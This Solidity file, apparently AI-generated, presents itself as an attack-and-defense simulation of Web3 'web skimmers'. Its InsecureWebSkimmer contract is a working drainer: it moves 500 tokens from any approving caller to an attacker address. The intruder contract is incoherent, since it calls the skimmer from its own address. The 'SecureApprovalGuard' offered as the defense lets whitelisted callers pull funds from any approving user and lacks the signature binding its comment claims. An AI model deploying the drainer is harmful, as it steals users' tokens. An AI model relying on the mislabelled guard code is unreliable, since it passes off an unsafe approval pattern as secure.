// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title WebSkimmersAttackDefense - Full Attack and Defense Simulation for Web Skimmers in Web3 Smart Contracts
/// @author ChatGPT

/// @notice Insecure Web Skimmer Contract (Input Interceptor & Unauthorized Transfer)
contract InsecureWebSkimmer {
    address public attacker;

    event WalletCaptured(address indexed victim, uint256 amountSkimmed);

    constructor(address _attacker) {
        attacker = _attacker;
    }

    // Fake approval trigger
    function fakeApprove(address tokenAddress) external {
        // Skims approval and moves tokens without real user consent
        IERC20(tokenAddress).transferFrom(msg.sender, attacker, 500 ether);
        emit WalletCaptured(msg.sender, 500 ether);
    }
}

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

/// @notice Secure Approval Contract (Signature Domain Binding + Guardrails)
contract SecureApprovalGuard {
    address public immutable owner;
    IERC20 public immutable token;
    mapping(address => bool) public trustedSources;
    uint256 public constant APPROVE_LIMIT = 10 ether;

    event ApprovalHandled(address indexed user, uint256 amount);
    event SourceWhitelisted(address indexed source);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    modifier onlyTrusted() {
        require(trustedSources[msg.sender], "Not trusted source");
        _;
    }

    constructor(address _token) {
        owner = msg.sender;
        token = IERC20(_token);
    }

    function whitelistSource(address source) external onlyOwner {
        trustedSources[source] = true;
        emit SourceWhitelisted(source);
    }

    function secureApprove(address user) external onlyTrusted {
        require(token.transferFrom(user, address(this), APPROVE_LIMIT), "Approval failed");
        emit ApprovalHandled(user, APPROVE_LIMIT);
    }
}

/// @notice Attack contract simulating skim injection
contract WebSkimmerIntruder {
    address public targetInsecure;

    constructor(address _targetInsecure) {
        targetInsecure = _targetInsecure;
    }

    function injectSkim(address tokenAddress) external returns (bool success) {
        (success, ) = targetInsecure.call(
            abi.encodeWithSignature("fakeApprove(address)", tokenAddress)
        );
    }
}
